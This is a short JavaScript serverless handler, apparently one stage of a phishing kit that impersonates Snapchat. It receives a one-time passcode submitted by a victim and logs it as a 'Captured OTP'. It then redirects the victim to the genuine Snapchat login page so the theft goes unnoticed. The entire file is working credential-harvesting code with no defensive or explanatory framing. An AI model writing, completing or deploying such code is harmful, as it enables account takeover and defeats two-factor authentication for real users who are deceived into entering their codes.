// api/verify-otp.js

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  try {
    const { otp } = req.body;

    // Log the captured OTP
    console.log(`STEP 2 - Captured OTP: ${otp}`);

    // Redirect the user to the real Snapchat login page
    res.redirect(307, 'https://accounts.snapchat.com/accounts/login');

  } catch (error) {
    console.error('Error in verify-otp function:', error);
    res.status(500).send('Internal Server Error');
  }
}
